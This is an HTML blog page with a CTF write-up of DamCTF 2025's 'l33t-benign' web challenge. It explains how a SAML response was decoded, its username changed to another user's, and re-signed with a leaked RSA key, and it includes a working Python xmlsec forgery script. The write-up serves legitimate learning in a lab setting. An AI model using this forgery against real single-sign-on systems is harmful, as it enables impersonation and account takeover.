@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>l33t-benign &ndash; alanoo.dev</title>
+    <meta name="description" content="My dev page :)">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="/css/colour/gruvbox-dark.css">
+    <link rel="stylesheet" href="/css/colour/dark-mode.css">
+    <link rel="stylesheet" href="/css/risotto.css">
+    <link rel="stylesheet" href="/css/custom.css">
+</head>
+
+<body>
+    <div class="page">
+        <header class="page__header">
+            <h1 class="page__logo"><a href="/" class="page__logo-inner">alanoo.dev</a></h1>
+            <nav class="page__nav main-nav">
+                <ul>
+    
+    
+                    <li class="main-nav__item"><a class="nav-main-item" href="/achievements/" title="Posts">Achievements</a></li>
+                    
+                    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="Writeups">Writeups</a></li>
+                
+                    <li class="main-nav__item"><a class="nav-main-item" href="/posts/" title="Projects">wip</a></li>
+                    
+                    </ul>
+            </nav>
+        </header>
+
+        <section class="page__body">
+            <header class="content__header">
+                <h1>l33t-benign <code><span style="color:#2ed8e8">web</code></h1>
+            </header>
+            <div class="content__body">
+                <h2 id="kategori">Category</h2>
+                <p>Web</p>
+                <h2 id="author">Chall Authors</h2>
+                <p>WholeWheatBagels & Alex</p>
+                <h2 id="stats">Stats</h2>
+                <p>Total Solves: <strong>41/781 Teams</strong></p>
+                <p>Final Points: <strong>479p</strong></p>
+                <h2 id="description">Description</h2>
+                <p>Now that you've figured out who was behind this operation, can you figure out who else was affected?</p>
+                <p>(You probably should solve l33t-dangerous first.)</p>
+                <h2 id="prewords">Preface</h2>
+                <p>This is part 2 of the chall, this time being web. I would reccomend you read part 1 to understand how I got here:<p>
+                <ul>
+                    <li><a href="/writeups/damctf-2025/l33t-dangerous/">Part 1</a> <code><span style="color:#cfa63f">misc</code></li>
+                </ul>
+                <h2 id="info">Gathering New Info</h2>
+                <p>Now that I had gotten an account on the website I decided to start looking at the new board called <strong>Hacking</strong>.</p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/crx.png"></p>
+                <p>Okay this is huge! The line "just don't forget to change the user field to your username. it uses the forum's auth so you already have access to it!" is telling us that the SimpleSAMLphp page which had the /payload endpoint uses the same login as the forums do.</p>
+                <p>Which means that if we could login to for example our account on the forums we could login to the C2 using the same account.</p>
+                <p>But theres another post that's important:</p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/rsa.png"></p>
+                <p>Prior to this challenge I had never interacted with or even heard about SAML. So an hour or so later of me googling how it worked and asking chatgpt I had a gameplan.</p>
+                <p>This Key that we had gotten is a RSA key to be able to sign SamlSessions, basically a cookie that authenticates you.</p>
+                <p>So if we logged in with for example "alanoo" then changing the session to NAVI and signing it with the RSA key we could thus login as NAVI, simple.</p>
+                <h2 id="burp">Execution - Burp</h2>
+                <p>Going back to the payload site i tried logging in with the account I made in the last chall:</p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/login.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/post.png"></p>
+                <p>This as we can see gives us a SAMLSession and posts to /saml/acs which is the validator on the server.</p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/alanoo.png"></p> 
+                <h2 id="saml">Execution - SAML</h2>
+                <p>Nice we now know it works. Knowing SAMLSessions are usually base64 encoded i used this nice tool to decode it:</p>
+                <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">https://www.samltool.com/encrypt.php
+</code></pre></div>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/onelogin.png"></p> 
+                <p>Base64 Decoding it we get a big xml payload which contains a bunch of things like the X.509 cert and the attributes.</p>
+                <p>Heres the XML for reference:</p>
+<div class="highlight">
+    <pre style="font-size: 14px;">
+        <code class="language-xml">
+            <div class="saml-response">
+&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; ID=&quot;_de4c34dec6110333964cf7ea08ea130e1d41ce7e27&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2025-05-12T09:19:04Z&quot; Destination=&quot;https://mwaas.el1t3.fun/saml/acs/&quot; InResponseTo=&quot;_b5276d650dc0420ba9ffc9e0e77078b2&quot;&gt;&lt;saml:Issuer&gt;https://el1t3.fun/saml-idp&lt;/saml:Issuer&gt;&lt;ds:Signature xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot;&gt;&amp;gt;
+  &amp;lt;&lt;ds:SignedInfo&gt;&lt;ds:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;/&gt;&amp;gt;
+    &amp;lt;&lt;ds:SignatureMethod Algorithm=&quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&quot;/&gt;&amp;gt;
+  &amp;lt;&lt;ds:Reference URI=&quot;#_de4c34dec6110333964cf7ea08ea130e1d41ce7e27&quot;&gt;&lt;ds:Transforms&gt;&lt;ds:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;/&gt;&lt;ds:Transform Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;/&gt;&lt;/ds:Transforms&gt;&lt;ds:DigestMethod Algorithm=&quot;http://www.w3.org/2001/04/xmlenc#sha256&quot;/&gt;&lt;ds:DigestValue&gt;OFx4icYpikCFKvalS/apiOXgPZlszfzB6z14rQKOAF4=&lt;/ds:DigestValue&gt;&lt;/ds:Reference&gt;&lt;/ds:SignedInfo&gt;&lt;ds:SignatureValue&gt;KaNv6ujCxMCAL6/EydYGkqqwxoS5iA25I8Q2UGHQckmJ/4g4bJM+BMryGQlTdeFNlgt7KCzA9E5IHkdpF6s6lweXaBhx1qyLTauvXGZd786ASgGwbXjS+vW0vsJJ5afy9/+OTq6wRb9zvKAbIQQHHdJ7a7nyuGmwHs3kpmkaR042YP4g/bl0lXKN5BB789PmtyQToTHQqPL7tS/pjbbDT4HEjldoKyJJe1hbGVaxhdovyqfwe/KCBtq8TMF5KfvdZIzRh/2HY6FKnTkR3nAf6FNSHMfO1O6ZM206SMzTxzhIcAY1479sjb4inbG1cfYEneCgmc6MM8uDUfsBPkPYGEsVKaLNAUv/1oJXs2DC47+c+U/yG1+ZPDE6IH3lL9+kV57LrSWiIpP3ctXiPv/cnm4n2Hnma/sskBZrfHYfx3oojKJPoq3hD2nmIGp8xaRIhtxym4dAKpuAyldM0wfnMYs5gbaItWMSzIReZpVj+kr3UTf9z0cHW6GddnW508NHeen2iOYJleZ6VJmb9z1CXeKVlee8ReIhPVcW2k+zIySYd498xqiLGc5aQrIX8crOkV4xsQg/0fQiAAz0wqNeCBSopftqnUv4D7ywBwEdHtyI6jhNfUJVpB3hH9n2KjgmxbuGYx9hkHpF/MLR3wB/E1fdnSdIHnzkKqCYwvLQwFc=&lt;/ds:SignatureValue&gt;&amp;gt;
+&amp;lt;&lt;ds:KeyInfo&gt;&lt;ds:X509Data&gt;&lt;ds:X509Certificate&gt;MIIFKDCCAxCgAwIBAgIUEHDMkqFpHdT5iEPIy8tQ91HNlygwDQYJKoZIhvcNAQELBQAwFDESMBAGA1UEAxMJZWwxdDMuZnVuMB4XDTI1MDUwOTAzMjgzN1oXDTM1MDUwNzAzMjgzN1owFDESMBAGA1UEAxMJZWwxdDMuZnVuMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArx9/CSXyqBPTvoic3rudBYe1xSGXyc6g12EAPqf4k0UR6d0XefHIh1jAdt2hQA8oZkBAZPB4bH4Ci+pczsJOf70sguXYtrZxvqHBEUdxCwIDswRPQmipnsvqA6D/nV+AgeD2V4m8Dfmc1BFlNrAyxCtXksNVh8VJ2px7kaNkdIKCkA58m8b9I36A79MXFoByk6TEfJCO4X/Flq5O4iASJZy6ZVy6JqXpwhKhSiRitihh/+RLboNUIyg1IVEoFW3TmjQXQCUGmVN5itkKeo1dL5yNvM8RWPbErJRHI0A6OgIllbGTQPKJyG3yU+/ofAmxSQBJykmVWWHQH4Wt3Zcof0cWtoT+y3USz6bE+YkPA+us5d0bZXbbXR4djKWugMBaXLhZ6fg+haduEHi9Ke14+0xhKCzSIRlHkX/mqK1/iqTLM5sqQZQHJDigphaHu/dtgRcr5twKcAIS/j0n7NcvhM6z52cbIdV1oDT1saOateLHrF33fFtwvUekxiS/zCEpEzy4Eev+A2XtBw67nV39+ITcRkRdIonBojfUVaWGmVTSebLglroE9kiBRY5UBRVtE9EFzM1zTUXLsAdH4v3M8y9WoeLs/w6Y8LF2EguAlCvlQDHXJnCGLtrtWzPQq8eQ1PlxFJt+m2kCGaTlG6R1HQPX3PUkD1d6DP7quQtp2WsCAwEAAaNyMHAwTwYDVR0RBEgwRoIJZWwxdDMuZnVuhjlodHRwczovL2VsMXQzLmZ1bi9zaW1wbGVzYW1sL21vZHVsZS5waHAvc2FtbC9pZHAvbWV0YWRhdGEwHQYDVR0OBBYEFIZwXHq7LqjTGErj7kjMh6DfEpTTMA0GCSqGSIb3DQEBCwUAA4ICAQAh+XLeGKTOseD+1GreGhkjiBML2g/7I92U5pvq5+4xE6IxhUBSHROWOwKR+gY/bBoiXFAJcCKyjnjzCk842GEBViCw5d5R78RYN08TxGVNqvwv32KlYEtD0iWVajnd+rJDGSRpjPybNzb3d8nTZkLAX2zK43rlDR7wlZ1TQY1YlS9UopJS0xlWH5kQf5fsr8iPawVZeCYqSUgYDPsevgJAHPjvO3XLaHnxXuxkfcv0EPrY1lVi1G7PMW+GQ9MN+ZOiLWfMJmrbHmPuGhXG0neIV4rVrMaUWPxwfyndtjf2AjQcDGV61Z1rP4ZecDSaJnNBhUitTKtsmglPEViSirsDhewn76Sir8+tepxhR1aKhR9jwqopjDzwv2ooICTdeYMWTGcE4nRN3rSs7jxXrwol6RwxINzkYzaxx/YRWfuuwW2Y3kA+5f+2IEhaztzDV68qtUa31o3+MkHVbJ/++vx4If9e7ja49JyYVCgxezFeLr9xx4UDmssgTQYLZu/0wYyRG/xKD6TGOEFT5hAepwbWFBwdL/uiXG51zLxs40qqbGDnoYlDfIBLSGobh/TS+qvQB6LARiFwqWpUvu1heNR/lmnl0d9cjILkyQ8yvs7xspziBLUH/REBVgnTXDkjbDVRMtyllbszfuKSLwrKcHkmcv96R1ZiO95rnFEHXZbbIQ==&lt;/ds:X509Certificate&gt;&lt;/ds:X509Data&gt;&lt;/ds:KeyInfo&gt;&lt;/ds:Signature&gt;&lt;samlp:Status&gt;&lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;/&gt;&lt;/samlp:Status&gt;&lt;saml:Assertion xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; ID=&quot;_ba0af7b585780a84845fa0ce4b905f96aa9a43ac5c&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2025-05-12T09:19:04Z&quot;&gt;&lt;saml:Issuer&gt;https://el1t3.fun/saml-idp&lt;/saml:Issuer&gt;&lt;ds:Signature xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot;&gt;&amp;gt;
+  &amp;lt;&lt;ds:SignedInfo&gt;&lt;ds:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;/&gt;&amp;gt;
+    &amp;lt;&lt;ds:SignatureMethod Algorithm=&quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&quot;/&gt;&amp;gt;
+  &amp;lt;&lt;ds:Reference URI=&quot;#_ba0af7b585780a84845fa0ce4b905f96aa9a43ac5c&quot;&gt;&lt;ds:Transforms&gt;&lt;ds:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;/&gt;&lt;ds:Transform Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;/&gt;&lt;/ds:Transforms&gt;&lt;ds:DigestMethod Algorithm=&quot;http://www.w3.org/2001/04/xmlenc#sha256&quot;/&gt;&lt;ds:DigestValue&gt;/cGxTuoEGHVBNDHCK9LDSA6rcpdQ0e3hZyHfyyfVQZQ=&lt;/ds:DigestValue&gt;&lt;/ds:Reference&gt;&lt;/ds:SignedInfo&gt;&lt;ds:SignatureValue&gt;ccmDEmKjpGlbUQfGVmKRdbEN0IiH5yK2jPXpRZv4LS6/wX+P+j2jWxGskpq3gix1Eks9SyiCkL/wVnVJjNtkUCHAUNQpd6beJKRf+VkRteqTZfq0qFol4E1FMeNkw2feUTIiRIxLefpi3bN4cZobWiS5P6Fs0uRzHa4xd9s+hyLpz3dX1cjQrTK6c3GDmRVDX4cPQRvpoZDD2DirOXBkpmPV0aMPhir9HaCK14fF5mzvz6eXaXd+lAhMODW1ORYvhiKshZzZKGszlhtE2D516PSbWt8KmJ1JomuXNFGCZ1fUqT4L+2QoPtn8jwQ4VRRC/UKO3CZ+JcCRhhGLAZxjoqcgBaV6rmaRtKFV/VyQ6jkMybwqp6yM2n/IN2zVBlNyR8leSrtJcwOp1VgJPwwekto3xQMnAj4UnOj3pgAzpS8x8clJkY4R55RhYlo4b9i5lyWW6TiW5HwKeNmIh2HhM+oE7Xvl7AThy9ims0/e0ciRSeSQKz7KU8tcmJgzWTiuAGufHTGRwmx/OeBxMsLJAWOajmJ1LWV56lCASg7Z6xficOxbgSF1FrsTTEqEoBKxeoSYmhCmNqVErFhnAt6cMO2Iw4XxWmE02mUYe6oOTiiiRLIWc2gGTd300LuqX6xvoP9+DP7+jVFipIhSgc0C/idu9FILBJzzS2QRhJD45lg=&lt;/ds:SignatureValue&gt;&amp;gt;
+&amp;lt;&lt;ds:KeyInfo&gt;&lt;ds:X509Data&gt;&lt;ds:X509Certificate&gt;MIIFKDCCAxCgAwIBAgIUEHDMkqFpHdT5iEPIy8tQ91HNlygwDQYJKoZIhvcNAQELBQAwFDESMBAGA1UEAxMJZWwxdDMuZnVuMB4XDTI1MDUwOTAzMjgzN1oXDTM1MDUwNzAzMjgzN1owFDESMBAGA1UEAxMJZWwxdDMuZnVuMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArx9/CSXyqBPTvoic3rudBYe1xSGXyc6g12EAPqf4k0UR6d0XefHIh1jAdt2hQA8oZkBAZPB4bH4Ci+pczsJOf70sguXYtrZxvqHBEUdxCwIDswRPQmipnsvqA6D/nV+AgeD2V4m8Dfmc1BFlNrAyxCtXksNVh8VJ2px7kaNkdIKCkA58m8b9I36A79MXFoByk6TEfJCO4X/Flq5O4iASJZy6ZVy6JqXpwhKhSiRitihh/+RLboNUIyg1IVEoFW3TmjQXQCUGmVN5itkKeo1dL5yNvM8RWPbErJRHI0A6OgIllbGTQPKJyG3yU+/ofAmxSQBJykmVWWHQH4Wt3Zcof0cWtoT+y3USz6bE+YkPA+us5d0bZXbbXR4djKWugMBaXLhZ6fg+haduEHi9Ke14+0xhKCzSIRlHkX/mqK1/iqTLM5sqQZQHJDigphaHu/dtgRcr5twKcAIS/j0n7NcvhM6z52cbIdV1oDT1saOateLHrF33fFtwvUekxiS/zCEpEzy4Eev+A2XtBw67nV39+ITcRkRdIonBojfUVaWGmVTSebLglroE9kiBRY5UBRVtE9EFzM1zTUXLsAdH4v3M8y9WoeLs/w6Y8LF2EguAlCvlQDHXJnCGLtrtWzPQq8eQ1PlxFJt+m2kCGaTlG6R1HQPX3PUkD1d6DP7quQtp2WsCAwEAAaNyMHAwTwYDVR0RBEgwRoIJZWwxdDMuZnVuhjlodHRwczovL2VsMXQzLmZ1bi9zaW1wbGVzYW1sL21vZHVsZS5waHAvc2FtbC9pZHAvbWV0YWRhdGEwHQYDVR0OBBYEFIZwXHq7LqjTGErj7kjMh6DfEpTTMA0GCSqGSIb3DQEBCwUAA4ICAQAh+XLeGKTOseD+1GreGhkjiBML2g/7I92U5pvq5+4xE6IxhUBSHROWOwKR+gY/bBoiXFAJcCKyjnjzCk842GEBViCw5d5R78RYN08TxGVNqvwv32KlYEtD0iWVajnd+rJDGSRpjPybNzb3d8nTZkLAX2zK43rlDR7wlZ1TQY1YlS9UopJS0xlWH5kQf5fsr8iPawVZeCYqSUgYDPsevgJAHPjvO3XLaHnxXuxkfcv0EPrY1lVi1G7PMW+GQ9MN+ZOiLWfMJmrbHmPuGhXG0neIV4rVrMaUWPxwfyndtjf2AjQcDGV61Z1rP4ZecDSaJnNBhUitTKtsmglPEViSirsDhewn76Sir8+tepxhR1aKhR9jwqopjDzwv2ooICTdeYMWTGcE4nRN3rSs7jxXrwol6RwxINzkYzaxx/YRWfuuwW2Y3kA+5f+2IEhaztzDV68qtUa31o3+MkHVbJ/++vx4If9e7ja49JyYVCgxezFeLr9xx4UDmssgTQYLZu/0wYyRG/xKD6TGOEFT5hAepwbWFBwdL/uiXG51zLxs40qqbGDnoYlDfIBLSGobh/TS+qvQB6LARiFwqWpUvu1heNR/lmnl0d9cjILkyQ8yvs7xspziBLUH/REBVgnTXDkjbDVRMtyllbszfuKSLwrKcHkmcv96R1ZiO95rnFEHXZbbIQ==&lt;/ds:X509Certificate&gt;&lt;/ds:X509Data&gt;&lt;/ds:KeyInfo&gt;&lt;/ds:Signature&gt;&lt;saml:Subject&gt;&lt;saml:NameID SPNameQualifier=&quot;https://mwaas.el1t3.fun/saml/metadata.xml&quot; Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;_ed696defa2f9334a9267b8e2c7ff7ed999b6ed6211&lt;/saml:NameID&gt;&lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;&lt;saml:SubjectConfirmationData NotOnOrAfter=&quot;2025-05-12T09:24:04Z&quot; Recipient=&quot;https://mwaas.el1t3.fun/saml/acs/&quot; InResponseTo=&quot;_b5276d650dc0420ba9ffc9e0e77078b2&quot;/&gt;&lt;/saml:SubjectConfirmation&gt;&lt;/saml:Subject&gt;&lt;saml:Conditions NotBefore=&quot;2025-05-12T09:18:34Z&quot; NotOnOrAfter=&quot;2025-05-12T09:24:04Z&quot;&gt;&lt;saml:AudienceRestriction&gt;&lt;saml:Audience&gt;https://mwaas.el1t3.fun/saml/metadata.xml&lt;/saml:Audience&gt;&lt;/saml:AudienceRestriction&gt;&lt;/saml:Conditions&gt;&lt;saml:AuthnStatement AuthnInstant=&quot;2025-05-12T09:19:04Z&quot; SessionNotOnOrAfter=&quot;2025-05-12T17:19:04Z&quot; SessionIndex=&quot;_0783e243535cd627304f1f0b339a2fc99617baf7b9&quot;&gt;&lt;saml:AuthnContext&gt;&lt;saml:AuthnContextClassRef&gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport&lt;/saml:AuthnContextClassRef&gt;&lt;/saml:AuthnContext&gt;&lt;/saml:AuthnStatement&gt;&lt;saml:AttributeStatement&gt;&lt;saml:Attribute Name=&quot;username&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:uri&quot;&gt;&lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;alanoo&lt;/saml:AttributeValue&gt;&lt;/saml:Attribute&gt;&lt;/saml:AttributeStatement&gt;&lt;/saml:Assertion&gt;&lt;/samlp:Response&gt;&amp;gt;
+    </div>
+       </code>
+    </pre>
+</div>
+                <p>Now all I needed to do was to change the username "alanoo" to NAVI and then resign it using the same tool.</p>
+                <p>During the CTF I ran into some issues with double signing the XML so i ended up just writing a script to do it:</p>
+<div class="highlight">
+    <pre style="font-size: 14px;">
+        <code class="language-python">
+import base64
+from lxml import etree
+import xmlsec
+
+with open("saml.txt", "r") as f:
+    saml_b64 = f.read().strip()
+
+saml_xml = base64.b64decode(saml_b64)
+parser = etree.XMLParser(remove_blank_text=True)
+xml_doc = etree.fromstring(saml_xml, parser)
+
+for elem in xml_doc.iter():
+    if elem.text and "alanoo" in elem.text:
+        elem.text = elem.text.replace("alanoo", "NAVI")
+for sig in xml_doc.findall(".//{http://www.w3.org/2000/09/xmldsig#}Signature"):
+    sig.getparent().remove(sig)
+
+assertion = xml_doc.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
+signature_node = xmlsec.template.create(
+    xml_doc,
+    xmlsec.Transform.EXCL_C14N,
+    xmlsec.Transform.RSA_SHA256,
+    ns="ds"
+)
+
+issuer = assertion.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}Issuer")
+assertion.insert(assertion.index(issuer) + 1, signature_node)
+
+ref = xmlsec.template.add_reference(
+    signature_node, xmlsec.Transform.SHA256
+)
+xmlsec.template.add_transform(ref, xmlsec.Transform.ENVELOPED)
+xmlsec.template.add_transform(ref, xmlsec.Transform.EXCL_C14N)
+key_info = xmlsec.template.ensure_key_info(signature_node)
+xmlsec.template.add_key_name(key_info)
+
+
+key = xmlsec.Key.from_file("private_key.pem", xmlsec.KeyFormat.PEM)
+sign_ctx = xmlsec.SignatureContext()
+sign_ctx.key = key
+sign_ctx.sign(signature_node)
+new_xml = etree.tostring(xml_doc, pretty_print=False)
+new_b64 = base64.b64encode(new_xml).decode()
+
+with open("newsaml.txt", "w") as out:
+    out.write(new_b64)
+
+print("done")
+        </code>
+    </pre></div>
+                <h2 id="username">Finding the Username</h2>
+                <p>Logging in as NAVI now shows us this:</p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/navi.png"></p>
+                <p>Nice! But there's just one problem. The flag isn't here...</p>
+                <p>I rechecked burp suite's logs to see if I missed anything and yes I did:</p>
+
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/burpalanoo.png"></p>
+                <p>It seems that when you login the server gets the creds of the persons victims.</p>
+                <p>It not only does that but it also shows every single credential and wether or not you own it.</p>
+                <p>Thus I tried every single UUID until I found this strange username:</p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/image.png"></p>
+                <p><code>come on, you don't have permission to steal creds that Gr4deRaider rightfully stole themselves</code></p>
+                <p>I've never seen this username and considering that there only is 1 cred that this username has stolen it was safe to assume that this was our goal.</p>
+                <p>Using the same script as before I logged in to <strong>Gr4deRaider</strong> and found this:</p>
+
+                <h2 id="flag">Flag</h2>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/flag.png"></p>
+                <code><span style="color:#c3b8de">dam{at_lea5t_theres_no_saml_in_detention}</span></code>
+                <h2 id="afterwords">Afterwords</h2>
+                <p>This was a very nice chall. I appriciate the effort the authors put into it. The immersion was insane! Thank you for a nice experience.</p>
+                <p>Oh yeah, as the CTF was ending 13x1 found a way to write in the teamspeak channel. We just changed our nickname lmao. After that the admins joined, they played music and shitposted :></p>
+                <h2 id="shitpost">Shitpost</h2>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/misc1.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/misc2.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/misc4.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-benign/assets/misc3.png"></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            </div>
+            <footer class="content__footer"></footer>
+        </section>
+
+        <section class="page__aside">
+            <div class="aside__about">
+                <div class="aside__about">
+                    <h1 class="about__title">alanoo.dev</h1>
+                    <p class="about__description">My dev page :).</p>
+                </div>
+                <ul class="aside__social-links">
+                    <li>
+                        <a href="https://admin.tryhackme.com" rel="me" aria-label="secret" title="secret"><i class="fas fa-flag" aria-hidden="true"></i></a>&nbsp;
+                    </li>
+                </ul>
+                
+            </div>
+            <hr>
+            <div class="aside__content">
+                <p>
+                    By alanoo, 
+                    2025-05-12
+                </p>
+                <hr>
+                <span style="color:#ca7c9f">Table of Contents:</span>
+                <nav id="TableOfContents">
+
+                    <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">1.</span> <a href="#description">Description</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">2.</span> <a href="#prewords">Preface</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">3.</span> <a href="#info">Gathering New Info</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">4.</span> <a href="#burp">Execution - Burp</a>
+                      </div>
+                    <div><span style="color:#4d5859">5.</span> <a href="#saml">Execution - SAML</a></div>
+                    <div><span style="color:#4d5859">6.</span> <a href="#username">Finding the Username</a></div>
+                    <div><span style="color:#4d5859">7.</span> <a href="#flag">Flag</a></div>
+                    <div><span style="color:#4d5859">8.</span> <a href="#afterwords">Afterwords</a></div>
+                    <div><span style="color:#4d5859">9.</span> <a href="#shitpost">Shitpost</a></div>
+
+        </nav>
+
+        
+                        </div>
+                        <p></p>
+                        <div class="logo-container" style="display: flex; justify-content: center; align-items: center;">
+                            <img class="w-100 mx-auto d-block cyber-glitch-0" 
+                                style="max-width: 300px; padding: 25px; padding-top: 0;" 
+                                src="/writeups/damctf-2025/assets/image.png">
+                        </div>
+                    </section>
+        
+                    <footer class="page__footer"><p>
+        
+            <p class="copyright"></p>
+            <p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+        </footer>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+
+</body>
+
+</html>
